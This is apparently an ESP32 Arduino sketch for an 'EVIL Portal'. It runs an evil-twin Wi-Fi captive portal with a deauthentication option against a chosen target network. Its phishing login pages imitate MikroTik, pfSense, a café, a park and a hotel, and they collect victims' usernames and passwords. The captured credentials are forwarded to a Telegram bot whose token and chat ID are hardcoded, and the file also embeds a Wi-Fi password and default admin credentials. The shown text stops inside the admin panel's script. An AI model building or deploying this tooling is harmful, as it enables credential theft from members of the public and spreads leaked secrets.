/*
 * ============================================================================
 * ESP32 - CAPTIVE PORTAL COMPLETO (VERSIÓN CORREGIDA - MENSAJES FIX)
 * ============================================================================
 * 
 * Versión: 15.1 - Mensajes Corregidos
 * Cambios:
 *   - Mensajes ocultos por defecto en CSS
 *   - SessionStorage para mensajes persistentes
 *   - Eliminado watchdog
 * ============================================================================
 */

#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFS.h>
#include <HTTPClient.h>
#include <ArduinoJson.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <array>

// ============================================================================
// PANTALLA OLED
// ============================================================================
#include <Wire.h>
#include <U8g2lib.h>

U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, /* reset=*/ U8X8_PIN_NONE);

unsigned long lastDisplayUpdate = 0;
const unsigned long DISPLAY_UPDATE_INTERVAL = 2000;

unsigned long lastPageChange = 0;
unsigned long pageRotationInterval = 8000;
bool autoRotationEnabled = true;
int displayPage = 0;

#define BTN_OLED 14
unsigned long lastButtonPress = 0;
const unsigned long BUTTON_DEBOUNCE = 300;
bool displayPaused = false;
unsigned long autoResumeTimer = 0;
const unsigned long AUTO_RESUME_DELAY = 10000;

bool credentialDisplayActive = false;
unsigned long credentialDisplayTime = 0;
const unsigned long CREDENTIAL_DISPLAY_DURATION = 4000;
String lastCredentialUser = "";
String lastCredentialPass = "";

const char* INSTITUTO = "ISTE";
const char* AUTOR = "Ivan Valle";
const char* PROYECTO = "EVIL Portal";

// ============================================================================
// CONFIGURACIÓN POR DEFECTO
// ============================================================================
#define DEFAULT_FAKE_SSID       "WiFi-Segura"
#define DEFAULT_FAKE_PASSWORD   ""
#define DEFAULT_TARGET_SSID     "PRUEBA"
#define DEFAULT_TARGET_BSSID    "64:D1:54:00:00:00"
#define DEFAULT_TELEGRAM_TOKEN  "8766692477:AAGD06vw3sAEDVIz9JyHLrnKVsvO8fz_mCQ"
#define DEFAULT_TELEGRAM_CHAT_ID "8699788760"
#define DEFAULT_STA_SSID        "Ecuatronix-2.4G"
#define DEFAULT_STA_PASSWORD    "ecuatronix25"
#define DEFAULT_CHANNEL         6

#define ADMIN_USERNAME          "admin"
#define ADMIN_PASSWORD          "admin123"

// ============================================================================
// SELECCIÓN DE PLANTILLA
// ============================================================================
#define TEMPLATE_MIKROTIK      0
#define TEMPLATE_PFSENSE       1
#define TEMPLATE_RESTAURANT    2
#define TEMPLATE_PARK          3
#define TEMPLATE_HOTEL         4

const char* template_names[] = {
    "MikroTik",
    "pfSense",
    "Restaurante",
    "Parque",
    "Hotel"
};

// ============================================================================
// VARIABLES DEL SISTEMA
// ============================================================================
const IPAddress ap_ip(8, 8, 8, 8);
const IPAddress gateway(8, 8, 8, 8);
const IPAddress subnet(255, 255, 255, 0);
const byte DNS_PORT = 53;

DNSServer dnsServer;
AsyncWebServer server(80);
AsyncWebServer adminServer(81);

unsigned long totalCaptures = 0;
bool staConnected = false;

const char* config_file = "/config.json";
const char* creds_file = "/creds.txt";

// ============================================================================
// CONSTANTES DE SEGURIDAD
// ============================================================================
#define MAX_SSID_LENGTH         32
#define MAX_PASSWORD_LENGTH     64
#define MAX_TOKEN_LENGTH        128
#define MAX_CHAT_ID_LENGTH      32
#define MAX_QUEUE_SIZE          30

// ============================================================================
// VARIABLES GLOBALES
// ============================================================================
String fake_ssid = DEFAULT_FAKE_SSID;
String fake_password = DEFAULT_FAKE_PASSWORD;
String target_ssid = DEFAULT_TARGET_SSID;
String target_bssid_str = DEFAULT_TARGET_BSSID;
std::array<uint8_t, 6> target_bssid{};
String telegram_token = DEFAULT_TELEGRAM_TOKEN;
String telegram_chat_id = DEFAULT_TELEGRAM_CHAT_ID;
String sta_ssid = DEFAULT_STA_SSID;
String sta_password = DEFAULT_STA_PASSWORD;
uint8_t operation_channel = DEFAULT_CHANNEL;
uint8_t current_channel = 0;
bool enable_deauth_attack = true;
bool enable_telegram = true;
int selected_template = TEMPLATE_MIKROTIK;

// ============================================================================
// ESTRUCTURA DE CREDENCIALES
// ============================================================================
struct Credential {
    String username;
    String password;
    unsigned long timestamp;
    
    Credential() : username(""), password(""), timestamp(0) {}
    Credential(const String& u, const String& p, unsigned long t) 
        : username(u), password(p), timestamp(t) {}
};

class SecureCredentialQueue {
private:
    std::array<Credential, MAX_QUEUE_SIZE> queue{};
    uint8_t head = 0;
    uint8_t tail = 0;
    uint8_t count = 0;
    
public:
    bool push(const String& username, const String& password) {
        if (count >= MAX_QUEUE_SIZE) return false;
        queue[tail] = Credential(username, password, millis() / 1000);
        tail = (tail + 1) % MAX_QUEUE_SIZE;
        count++;
        return true;
    }
    
    bool pop(Credential& out) {
        if (count == 0) return false;
        out = queue[head];
        head = (head + 1) % MAX_QUEUE_SIZE;
        count--;
        return true;
    }
    
    uint8_t size() const { return count; }
    bool isEmpty() const { return count == 0; }
    bool isFull() const { return count >= MAX_QUEUE_SIZE; }
    
    void clear() {
        head = tail = count = 0;
        for (auto& cred : queue) {
            cred.username = "";
            cred.password = "";
            cred.timestamp = 0;
        }
    }
};

SecureCredentialQueue pendingQueue;

// ============================================================================
// FUNCIONES DE VALIDACIÓN
// ============================================================================
bool isValidSSID(const String& ssid) {
    if (ssid.length() == 0 || ssid.length() > MAX_SSID_LENGTH) return false;
    for (unsigned int i = 0; i < ssid.length(); i++) {
        char c = ssid[i];
        if (c < 0x20 || c > 0x7E) return false;
    }
    return true;
}

bool isValidBSSID(const String& bssid) {
    if (bssid.length() != 17) return false;
    int hexCount = 0;
    for (unsigned int i = 0; i < bssid.length(); i++) {
        char c = bssid[i];
        if (i % 3 == 2) {
            if (c != ':') return false;
        } else {
            if (!isxdigit(c)) return false;
            hexCount++;
        }
    }
    return hexCount == 12;
}

bool parseBSSID(const String& bssid_str, std::array<uint8_t, 6>& bssid) {
    if (!isValidBSSID(bssid_str)) return false;
    int result = sscanf(bssid_str.c_str(), "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
                        &bssid[0], &bssid[1], &bssid[2],
                        &bssid[3], &bssid[4], &bssid[5]);
    return result == 6;
}

bool isValidChannel(int channel) {
    return channel >= 1 && channel <= 11;
}

String sanitizeInput(const String& input, size_t maxLen) {
    String sanitized;
    for (unsigned int i = 0; i < input.length() && i < maxLen; i++) {
        char c = input[i];
        if (c >= 0x20 && c <= 0x7E) {
            sanitized += c;
        }
    }
    return sanitized;
}

// ============================================================================
// FUNCIÓN DE URL ENCODE
// ============================================================================
String urlEncode(const String& str) {
    String encodedString;
    encodedString.reserve(str.length() * 3);
    
    for (unsigned int i = 0; i < str.length(); i++) {
        char c = str.charAt(i);
        if (c == ' ') {
            encodedString += '+';
        } else if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            encodedString += c;
        } else {
            encodedString += '%';
            char hexBuf[3];
            snprintf(hexBuf, sizeof(hexBuf), "%02X", (unsigned char)c);
            encodedString += hexBuf;
        }
    }
    return encodedString;
}

// ============================================================================
// PLANTILLAS DE PORTALES CAUTIVOS (MANTENIDAS DEL ORIGINAL)
// ============================================================================

const char* TEMPLATE_MIKROTIK_HTML PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>MikroTik</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#193d6e;font-family:Tahoma,sans-serif;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:10px}.outer{max-width:380px;width:100%}.header{background:#2C5A8D;border:1px solid #000;border-bottom:none;padding:10px 14px;display:flex;justify-content:space-between;border-radius:6px 6px 0 0}.header .logo{font-size:18px;font-weight:700;color:#fff}.header .logo span{color:#FFA000}.header .title{font-size:13px;color:#fff;font-weight:700}.content{background:#EEE;border:1px solid #000;border-top:none;padding:14px 16px;border-radius:0 0 6px 6px}.info-box{background:#fff;border:1px solid #aaa;padding:12px 14px;margin-bottom:12px;border-radius:4px}.info-box .info-title{font-size:14px;font-weight:700;color:#2C5A8D;margin-bottom:6px}.info-box p{color:#333;font-size:12px;line-height:1.5}.login-box{background:#fff;border:1px solid #aaa;padding:14px 16px;border-radius:4px}.login-box .login-title{font-size:13px;font-weight:700;border-bottom:1px solid #aaa;padding-bottom:8px;margin-bottom:12px;color:#333}.field-group{margin-bottom:12px}.field-group label{display:block;font-weight:700;color:#333;font-size:11px;margin-bottom:3px}.field-group input{width:100%;padding:8px 10px;border:1px solid #aaa;border-radius:3px;font-size:12px}.btn-login{width:100%;padding:10px;background:linear-gradient(to bottom,#3A7ABF,#2C5A8D);color:#fff;border:1px solid #1E3D60;border-radius:4px;font-size:14px;font-weight:700;cursor:pointer}.copyright{text-align:center;padding:10px 0 4px;color:#aaa;font-size:10px}.copyright .mikrotik{color:#FFA000}</style>
</head>
<body>
<div class="outer">
<div class="header"><div class="logo">Mikro<span>Tik</span></div><div class="title">HotSpot Gateway</div></div>
<div class="content">
<div class="info-box"><div class="info-title">Bienvenido</div><p>Autentiquese con sus credenciales.</p></div>
<div class="login-box">
<div class="login-title">Autenticacion</div>
<form action="/capture" method="POST">
<div class="field-group"><label>Usuario</label><input type="text" name="username" placeholder="usuario" required></div>
<div class="field-group"><label>Contrasena</label><input type="password" name="password" placeholder="••••••••" required></div>
<button type="submit" class="btn-login">Iniciar sesion</button>
</form>
</div>
</div>
<div class="copyright"><span class="mikrotik">MikroTik</span> HotSpot Gateway &copy; 1999-2024</div>
</div>
</body>
</html>
)rawliteral";

const char* TEMPLATE_PFSENSE_HTML PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>pfSense</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Arial,sans-serif;background:linear-gradient(135deg,#1a1a2e,#16213e);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.container{max-width:400px;width:100%;background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border-radius:16px;border:1px solid rgba(255,255,255,0.08);padding:30px}.logo{text-align:center;margin-bottom:25px}.logo h1{color:#fff;font-size:24px;font-weight:700}.logo h1 span{color:#00d4ff}.logo p{color:rgba(255,255,255,0.4);font-size:13px}.info{background:rgba(0,212,255,0.06);border:1px solid rgba(0,212,255,0.1);border-radius:10px;padding:14px;margin-bottom:20px;color:rgba(255,255,255,0.7);font-size:13px;text-align:center}.field-group{margin-bottom:16px}.field-group label{display:block;color:rgba(255,255,255,0.5);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}.field-group input{width:100%;padding:12px 14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:#fff;font-size:14px;outline:none}.field-group input:focus{border-color:rgba(0,212,255,0.3)}.field-group input::placeholder{color:rgba(255,255,255,0.2)}.btn{width:100%;padding:14px;background:linear-gradient(135deg,#00d4ff,#0099ff);border:none;border-radius:10px;color:#fff;font-size:15px;font-weight:600;cursor:pointer}.btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(0,212,255,0.2)}.footer{text-align:center;margin-top:16px;color:rgba(255,255,255,0.15);font-size:11px}
</style>
</head>
<body>
<div class="container">
<div class="logo"><h1>pf<span>Sense</span></h1><p>Captive Portal</p></div>
<div class="info">Conectese a la red publica</div>
<form action="/capture" method="POST">
<div class="field-group"><label>Usuario</label><input type="text" name="username" placeholder="usuario" required></div>
<div class="field-group"><label>Contrasena</label><input type="password" name="password" placeholder="••••••••" required></div>
<button type="submit" class="btn">Conectar</button>
</form>
<div class="footer"><span>Red segura</span><span>·</span><span>IEEE 802.1X</span></div>
</div>
</body>
</html>
)rawliteral";

const char* TEMPLATE_RESTAURANT_HTML PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>WiFi Restaurante</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Georgia,serif;background:linear-gradient(135deg,#2d1810,#4a2818);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.container{max-width:380px;width:100%;background:rgba(255,255,255,0.08);border-radius:20px;border:1px solid rgba(255,255,255,0.06);padding:30px;backdrop-filter:blur(10px)}.logo{text-align:center;margin-bottom:24px}.logo .icon{font-size:48px;display:block;margin-bottom:8px}.logo h1{color:#f5e6d3;font-size:26px;font-weight:400}.logo p{color:rgba(245,230,211,0.5);font-size:13px}.info{text-align:center;color:rgba(245,230,211,0.6);font-size:14px;margin-bottom:20px;padding:10px;background:rgba(255,255,255,0.05);border-radius:10px}.field-group{margin-bottom:16px}.field-group input{width:100%;padding:14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#f5e6d3;font-size:15px;outline:none;text-align:center}.field-group input:focus{border-color:rgba(245,230,211,0.2)}.field-group input::placeholder{color:rgba(245,230,211,0.2)}.btn{width:100%;padding:14px;background:linear-gradient(135deg,#d4a373,#b8835a);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:600;cursor:pointer}.btn:hover{transform:scale(1.02)}.footer{text-align:center;margin-top:16px;color:rgba(245,230,211,0.2);font-size:11px}
</style>
</head>
<body>
<div class="container">
<div class="logo"><span class="icon">☕</span><h1>WiFi Cafeteria</h1><p>Conectate y disfruta</p></div>
<div class="info">Acceso gratuito para clientes</div>
<form action="/capture" method="POST">
<div class="field-group"><input type="text" name="username" placeholder="Tu correo electronico" required></div>
<div class="field-group"><input type="password" name="password" placeholder="Contrasena" required></div>
<button type="submit" class="btn">Conectar ahora</button>
</form>
<div class="footer">Disfruta de tu estancia</div>
</div>
</body>
</html>
)rawliteral";

const char* TEMPLATE_PARK_HTML PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>WiFi Publico</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#1a472a,#2d6a4f);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.container{max-width:380px;width:100%;background:rgba(255,255,255,0.05);border-radius:20px;border:1px solid rgba(255,255,255,0.06);padding:30px;backdrop-filter:blur(10px)}.logo{text-align:center;margin-bottom:24px}.logo .icon{font-size:48px;display:block;margin-bottom:8px}.logo h1{color:#d8f3dc;font-size:24px;font-weight:300}.logo p{color:rgba(216,243,220,0.4);font-size:13px}.info{text-align:center;color:rgba(216,243,220,0.6);font-size:14px;margin-bottom:20px;padding:12px;background:rgba(255,255,255,0.04);border-radius:12px;border:1px dashed rgba(216,243,220,0.1)}.info .free{color:#95d5b2;font-weight:700;font-size:18px}.field-group{margin-bottom:16px}.field-group input{width:100%;padding:14px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.06);border-radius:12px;color:#d8f3dc;font-size:15px;outline:none;text-align:center}.field-group input:focus{border-color:rgba(216,243,220,0.2)}.field-group input::placeholder{color:rgba(216,243,220,0.2)}.btn{width:100%;padding:14px;background:linear-gradient(135deg,#40916c,#2d6a4f);border:none;border-radius:12px;color:#d8f3dc;font-size:16px;font-weight:600;cursor:pointer}.btn:hover{transform:scale(1.02)}.footer{text-align:center;margin-top:16px;color:rgba(216,243,220,0.15);font-size:11px}.terms{color:rgba(216,243,220,0.2);font-size:10px;margin-top:8px;text-align:center}
</style>
</head>
<body>
<div class="container">
<div class="logo"><span class="icon">🌳</span><h1>WiFi Publico</h1><p>Parque Central</p></div>
<div class="info"><span class="free">GRATUITO</span><br>Acceso a Internet sin costo</div>
<form action="/capture" method="POST">
<div class="field-group"><input type="text" name="username" placeholder="Correo electronico" required></div>
<div class="field-group"><input type="password" name="password" placeholder="Contrasena" required></div>
<button type="submit" class="btn">Acceder a Internet</button>
</form>
<div class="footer">Disfruta del espacio publico</div>
<div class="terms">Al conectarse acepta los terminos de uso</div>
</div>
</body>
</html>
)rawliteral";

const char* TEMPLATE_HOTEL_HTML PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Hotel WiFi</title>
<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Times New Roman',serif;background:linear-gradient(135deg,#1a1a2e,#2d2d44);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}.container{max-width:380px;width:100%;background:linear-gradient(135deg,rgba(255,255,255,0.04),rgba(255,255,255,0.01));border-radius:24px;border:1px solid rgba(255,215,0,0.1);padding:32px;backdrop-filter:blur(10px)}.logo{text-align:center;margin-bottom:24px}.logo .icon{font-size:40px;display:block;margin-bottom:6px}.logo h1{color:#ffd700;font-size:28px;font-weight:400;letter-spacing:2px}.logo p{color:rgba(255,215,0,0.3);font-size:12px;letter-spacing:4px;text-transform:uppercase}.info{text-align:center;color:rgba(255,215,0,0.4);font-size:13px;margin-bottom:20px;padding:12px;border-top:1px solid rgba(255,215,0,0.05);border-bottom:1px solid rgba(255,215,0,0.05)}.field-group{margin-bottom:16px}.field-group input{width:100%;padding:14px;background:rgba(255,255,255,0.04);border:1px solid rgba(255,215,0,0.06);border-radius:8px;color:#e8d5b5;font-size:15px;outline:none}.field-group input:focus{border-color:rgba(255,215,0,0.2)}.field-group input::placeholder{color:rgba(255,215,0,0.15)}.btn{width:100%;padding:14px;background:linear-gradient(135deg,#d4a843,#b8860b);border:none;border-radius:8px;color:#fff;font-size:16px;font-weight:600;cursor:pointer;letter-spacing:1px}.btn:hover{transform:scale(1.02)}.footer{text-align:center;margin-top:16px;color:rgba(255,215,0,0.1);font-size:11px}
</style>
</head>
<body>
<div class="container">
<div class="logo"><span class="icon">🏨</span><h1>Hotel WiFi</h1><p>Premium Guest Access</p></div>
<div class="info">Bienvenido huesped</div>
<form action="/capture" method="POST">
<div class="field-group"><input type="text" name="username" placeholder="Numero de habitacion / Email" required></div>
<div class="field-group"><input type="password" name="password" placeholder="Contrasena" required></div>
<button type="submit" class="btn">Acceder</button>
</form>
<div class="footer">Disfrute de su estancia</div>
</div>
</body>
</html>
)rawliteral";

// ============================================================================
// HTML DE ERROR
// ============================================================================
const char* error_html PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head><meta http-equiv="refresh" content="3;url=/"><title>Error</title></head>
<body style="background:#193d6e;text-align:center;padding:50px;">
<div style="background:#EEE;padding:20px;border-radius:8px;">
<h3 style="color:red;">Error de autenticacion</h3>
<p>Credenciales incorrectas. Intente nuevamente.</p>
</div>
</body>
</html>
)rawliteral";

// ============================================================================
// FUNCIÓN PARA OBTENER LA PLANTILLA
// ============================================================================
String getTemplateHTML(int template_id) {
    switch(template_id) {
        case TEMPLATE_PFSENSE:   return String(TEMPLATE_PFSENSE_HTML);
        case TEMPLATE_RESTAURANT: return String(TEMPLATE_RESTAURANT_HTML);
        case TEMPLATE_PARK:      return String(TEMPLATE_PARK_HTML);
        case TEMPLATE_HOTEL:     return String(TEMPLATE_HOTEL_HTML);
        case TEMPLATE_MIKROTIK:
        default:                 return String(TEMPLATE_MIKROTIK_HTML);
    }
}

// ============================================================================
// HTML DEL PANEL DE ADMINISTRACIÓN (VERSIÓN CORREGIDA)
// ============================================================================
const char* admin_html PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="es">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>ESP32 - Panel</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#0a0e1a;min-height:100vh;padding:20px;background:radial-gradient(ellipse at 10% 20%,rgba(16,36,94,0.3),transparent 50%),radial-gradient(ellipse at 90% 80%,rgba(46,16,94,0.2),transparent 50%),linear-gradient(135deg,#0a0e1a,#141b2d,#1a1a2e)}.container{max-width:820px;margin:0 auto}.card{background:rgba(255,255,255,0.04);backdrop-filter:blur(20px);border-radius:20px;border:1px solid rgba(255,255,255,0.06);overflow:hidden;margin-bottom:20px;box-shadow:0 20px 50px rgba(0,0,0,0.4)}.card-header{padding:16px 24px;background:rgba(255,255,255,0.03);border-bottom:1px solid rgba(255,255,255,0.05);display:flex;align-items:center;gap:12px}.card-header h2{color:#fff;font-size:16px;font-weight:600}.card-header .badge{margin-left:auto;font-size:10px;background:rgba(16,185,129,0.12);color:#34d399;padding:4px 12px;border-radius:100px;border:1px solid rgba(16,185,129,0.15)}.card-body{padding:20px 24px}.form-row{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-bottom:16px}.form-group{margin-bottom:16px}.form-group.full{grid-column:1/-1}.form-group label{display:block;color:rgba(255,255,255,0.5);font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:4px}.form-group .hint{color:rgba(255,255,255,0.2);font-size:10px;margin-top:4px}.form-group input,.form-group select{width:100%;padding:10px 14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:10px;color:#fff;font-size:13px;outline:none;transition:all .3s}.form-group input:focus,.form-group select:focus{border-color:rgba(99,102,241,0.3);background:rgba(255,255,255,0.07);box-shadow:0 0 0 3px rgba(99,102,241,0.05)}.form-group input::placeholder{color:rgba(255,255,255,0.15)}.form-group select option{background:#1a1a2e;color:#fff}.btn{padding:10px 20px;border:none;border-radius:10px;font-size:13px;font-weight:600;cursor:pointer;transition:all .3s}.btn-primary{background:linear-gradient(135deg,#6366f1,#8b5cf6);color:#fff;width:100%;padding:12px}.btn-primary:hover{transform:translateY(-1px);box-shadow:0 8px 25px rgba(99,102,241,0.25)}.btn-danger{background:rgba(239,68,68,0.15);color:#f87171;border:1px solid rgba(239,68,68,0.15)}.btn-danger:hover{background:rgba(239,68,68,0.25)}.btn-outline{background:transparent;color:rgba(255,255,255,0.4);border:1px solid rgba(255,255,255,0.08)}.btn-outline:hover{background:rgba(255,255,255,0.05);color:#fff}.btn-group{display:flex;gap:12px;margin-top:4px}.btn-group .btn{flex:1;text-align:center}.stats-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:12px}.stat-item{background:rgba(255,255,255,0.02);border-radius:12px;padding:14px 16px;text-align:center;border:1px solid rgba(255,255,255,0.03)}.stat-item .value{font-size:22px;font-weight:700;color:#fff;line-height:1.2}.stat-item .label{font-size:10px;color:rgba(255,255,255,0.3);text-transform:uppercase;letter-spacing:0.5px;margin-top:4px}.stat-item .value.green{color:#34d399}.stat-item .value.blue{color:#60a5fa}.stat-item .value.purple{color:#a78bfa}.stat-item .value.yellow{color:#fbbf24}.stat-item .value.red{color:#f87171}
/* ============================================================
   MENSAJES - OCULTOS POR DEFECTO
   ============================================================ */
.message{padding:12px 16px;border-radius:10px;font-size:13px;margin-bottom:16px;display:none}
.message.success{background:rgba(16,185,129,0.08);border:1px solid rgba(16,185,129,0.12);color:#34d399}
.message.error{background:rgba(239,68,68,0.08);border:1px solid rgba(239,68,68,0.12);color:#f87171}
.divider{height:1px;background:rgba(255,255,255,0.04);margin:20px 0}
#scanResults::-webkit-scrollbar{width:6px}
#scanResults::-webkit-scrollbar-track{background:rgba(255,255,255,0.02);border-radius:3px}
#scanResults::-webkit-scrollbar-thumb{background:rgba(255,255,255,0.1);border-radius:3px}
#scanResults::-webkit-scrollbar-thumb:hover{background:rgba(255,255,255,0.2)}
#scanResults table{font-size:11px;width:100%;border-collapse:collapse}
#scanResults table td{padding:5px 6px;border-bottom:1px solid rgba(255,255,255,0.02)}
#scanResults table th{padding:8px 6px;text-align:left;color:rgba(255,255,255,0.4);font-weight:400;border-bottom:1px solid rgba(255,255,255,0.05)}
@media(max-width:600px){.form-row{grid-template-columns:1fr}.stats-grid{grid-template-columns:repeat(2,1fr)}.btn-group{flex-direction:column}.card-body{padding:16px}#scanResults table{font-size:10px}#scanResults table td{padding:3px 4px}}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="card-header"><span>⚙️</span><h2>Configuracion</h2><span class="badge">● En vivo</span></div>
<div class="card-body">
<!-- MENSAJES: OCULTOS POR DEFECTO -->
<div class="message success" id="successMsg">Configuracion guardada</div>
<div class="message error" id="errorMsg">Error al guardar</div>
<form id="configForm" method="POST">
<div style="margin-bottom:20px;">
<h3 style="color:rgba(255,255,255,0.6);font-size:12px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;">AP Falso</h3>
<div class="form-row">
<div class="form-group"><label>SSID</label><input type="text" name="fake_ssid" id="fake_ssid" placeholder="WiFi-Segura" maxlength="32"><div class="hint">Nombre de la red</div></div>
<div class="form-group"><label>Contrasena</label><input type="text" name="fake_password" id="fake_password" placeholder="(vacio = abierta)" maxlength="63"><div class="hint">Dejar vacio para red abierta</div></div>
</div>
</div>
<div class="divider"></div>
<div style="margin-bottom:20px;">
<h3 style="color:rgba(255,255,255,0.6);font-size:12px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;">Red Objetivo</h3>
<div class="form-row">
<div class="form-group"><label>SSID objetivo</label><input type="text" name="target_ssid" id="target_ssid" placeholder="Oficina-MikroTik" maxlength="32"><div class="hint">Red a atacar</div></div>
<div class="form-group"><label>MAC objetivo</label><input type="text" name="target_bssid" id="target_bssid" placeholder="64:D1:54:00:00:00" maxlength="17" pattern="^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$"><div class="hint">Formato: AA:BB:CC:DD:EE:FF</div></div>
</div>
</div>
<div class="divider"></div>
<div style="margin-bottom:20px;">
<h3 style="color:rgba(255,255,255,0.6);font-size:12px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;">Telegram</h3>
<div class="form-row">
<div class="form-group"><label>Bot Token</label><input type="text" name="telegram_token" id="telegram_token" placeholder="1234567890:ABC..." maxlength="128"><div class="hint">De @BotFather</div></div>
<div class="form-group"><label>Chat ID</label><input type="text" name="telegram_chat_id" id="telegram_chat_id" placeholder="123456789" maxlength="32"><div class="hint">De @userinfobot</div></div>
</div>
</div>
<div class="divider"></div>
<div style="margin-bottom:20px;">
<h3 style="color:rgba(255,255,255,0.6);font-size:12px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;">Red STA</h3>
<div class="form-row">
<div class="form-group"><label>SSID WiFi</label><input type="text" name="sta_ssid" id="sta_ssid" placeholder="TuRedWiFi" maxlength="32"><div class="hint">Para enviar a Telegram</div></div>
<div class="form-group"><label>Contrasena</label><input type="password" name="sta_password" id="sta_password" placeholder="••••••••" maxlength="63"></div>
</div>
</div>
<div class="divider"></div>
<div style="margin-bottom:20px;">
<h3 style="color:rgba(255,255,255,0.6);font-size:12px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;">Portal Cautivo</h3>
<div class="form-group full">
<label>Plantilla</label>
<select name="template" id="template">
<option value="0">MikroTik</option>
<option value="1">pfSense</option>
<option value="2">Restaurante</option>
<option value="3">Parque</option>
<option value="4">Hotel</option>
</select>
<div class="hint">Portal que veran las victimas</div>
</div>
</div>
<div class="divider"></div>
<div style="margin-bottom:20px;">
<h3 style="color:rgba(255,255,255,0.6);font-size:12px;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:12px;">Opciones</h3>
<div class="form-row">
<div class="form-group"><label>Canal</label><input type="number" name="channel" id="channel" min="1" max="11" placeholder="6"><div class="hint">1-11</div></div>
<div class="form-group"><label>Deauth</label><select name="deauth" id="deauth"><option value="true">Activado</option><option value="false">Desactivado</option></select></div>
</div>
<div class="form-group full">
<label>Telegram</label><select name="telegram_enabled" id="telegram_enabled"><option value="true">Activado</option><option value="false">Desactivado</option></select>
</div>
</div>
<button type="submit" class="btn btn-primary">Guardar</button>
</form>
<div class="divider"></div>
<div class="btn-group">
<button onclick="rebootESP32()" class="btn btn-outline">Reiniciar</button>
<button onclick="clearCredentials()" class="btn btn-danger">Borrar</button>
</div>
</div>
</div>
<div class="card">
<div class="card-header"><span>📊</span><h2>Estadisticas</h2><span class="badge">● Actualizando</span></div>
<div class="card-body">
<div class="stats-grid" id="statsGrid">
<div class="stat-item"><div class="value blue" id="statCaptures">0</div><div class="label">Capturas</div></div>
<div class="stat-item"><div class="value green" id="statClients">0</div><div class="label">Clientes</div></div>
<div class="stat-item"><div class="value yellow" id="statChannel">0</div><div class="label">Canal</div></div>
<div class="stat-item"><div class="value purple" id="statDeauth">-</div><div class="label">Deauth</div></div>
<div class="stat-item"><div class="value" id="statSTA" style="color:rgba(255,255,255,0.3)">-</div><div class="label">STA</div></div>
<div class="stat-item"><div class="value red" id="statQueue">0</div><div class="label">Cola</div></div>
</div>
<div style="margin-top:12px;text-align:center;color:rgba(255,255,255,0.2);font-size:11px;"><span id="statsTime">Actualizando...</span></div>
</div>
</div>
<div class="card">
<div class="card-header"><span>📡</span><h2>Escaner de Redes</h2><span class="badge" id="scanStatus">● Listo</span></div>
<div class="card-body">
<div style="display:flex;gap:12px;margin-bottom:16px;">
<button onclick="scanNetworks()" class="btn btn-primary" style="flex:1;padding:10px;">Escanear</button>
<button onclick="clearScanResults()" class="btn btn-outline" style="flex:0.5;padding:10px;">Limpiar</button>
</div>
<div id="scanResults" style="max-height:300px;overflow-y:auto;font-size:12px;">
<div style="text-align:center;color:rgba(255,255,255,0.3);padding:20px;">Presiona "Escanear" para ver redes WiFi cercanas</div>
</div>
<div style="margin-top:12px;color:rgba(255,255,255,0.2);font-size:10px;text-align:center;">
<span id="scanTime"></span>
</div>
</div>
</div>
</div>
<script>
// ============================================================
// CONFIGURACIÓN Y ESTADÍSTICAS
// ============================================================
